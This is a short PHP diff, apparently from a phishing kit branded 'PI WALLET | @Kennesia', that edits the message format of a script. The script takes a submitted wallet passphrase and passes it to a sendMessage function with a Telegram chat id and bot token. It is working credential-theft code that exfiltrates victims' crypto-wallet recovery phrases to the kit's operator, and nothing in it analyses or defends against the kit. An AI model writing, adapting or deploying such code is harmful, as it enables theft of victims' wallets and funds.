@@ -10,11 +10,7 @@ if (!empty($content)) {  // Pengecekan apakah $content tidak kosong
     $message = "
     ( PI WALLET | @Kennesia )
 
-    - Passphrase : 
-    ▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁
-
-    ".$content."
-    ▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁
+    - Passphrase : ".$content."
     ";
 
     function sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot) {
